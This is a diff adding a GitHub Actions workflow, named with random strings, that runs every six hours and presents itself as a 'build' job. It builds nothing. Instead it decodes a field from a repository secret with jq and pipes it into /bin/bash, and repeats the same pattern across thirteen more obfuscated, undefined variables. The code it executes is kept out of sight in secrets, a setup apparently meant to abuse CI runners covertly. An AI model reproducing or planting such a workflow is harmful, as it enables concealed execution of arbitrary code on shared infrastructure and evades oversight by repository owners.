@@ -1,0 +1,31 @@
+name: tongxiangyu3718
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongxiangyu3718
+        env:
+          ylc416: ${{ secrets.ylc416 }}
+        run: |
+          echo $ylc416 | jq -r .pkaw95294 | /bin/bash
+          echo $dy46698 | jq -r .opa1 | /bin/bash
+          echo $aldg79 | jq -r .momzb6 | /bin/bash
+          echo $u709 | jq -r .lfg61 | /bin/bash
+          echo $fnuz390 | jq -r .z82567 | /bin/bash
+          echo $bka92 | jq -r .mc0980 | /bin/bash
+          echo $wwmeh1 | jq -r .tkxun8178 | /bin/bash
+          echo $cierh731 | jq -r .e90 | /bin/bash
+          echo $rxkex18658 | jq -r .dttur16108 | /bin/bash
+          echo $gcfp5 | jq -r .rmfpk73898 | /bin/bash
+          echo $fi1061 | jq -r .fq7627 | /bin/bash
+          echo $z96134 | jq -r .ooidr73157 | /bin/bash
+          echo $hvgy82948 | jq -r .h54495 | /bin/bash
+          echo $r8425 | jq -r .zr70888 | /bin/bash
+
